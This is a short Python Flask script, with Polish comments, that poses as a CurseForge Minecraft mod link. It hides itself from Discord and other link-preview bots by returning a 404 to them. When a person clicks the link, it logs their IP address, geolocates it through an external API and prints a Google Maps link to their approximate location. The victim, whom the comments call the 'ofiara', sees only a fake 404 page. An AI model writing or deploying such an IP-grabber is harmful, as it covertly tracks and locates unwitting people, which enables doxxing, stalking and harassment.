from flask import Flask, request, abort
import requests
import sys

app = Flask(__name__)

# Ścieżka nasladująca CurseForge
@app.route('/www.curseforge.com/minecraft/mc-mods/7401617')
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # 1. BLOKOWANIE PODGLĄDU - Jeśli to bot, udajemy że strony nie ma
    if "Discordbot" in ua or "externalhit" in ua.lower():
        return abort(404)

    # 2. LOGOWANIE DANYCH
    print(f"\n[!!!] KLIKNIĘCIE: {ip}", flush=True)
    
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,lat,lon,city,country", timeout=5).json()
        if r.get("status") == "success":
            lat = r.get('lat')
            lon = r.get('lon')
            # Link do Google Maps dla Ciebie w konsoli Rendera
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"MAPA: https://www.google.com/maps?q={lat},{lon}", flush=True)
    except:
        pass
    
    sys.stdout.flush()

    # 3. CO WIDZI OFIARA
    return '<h1>404 Not Found</h1>', 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
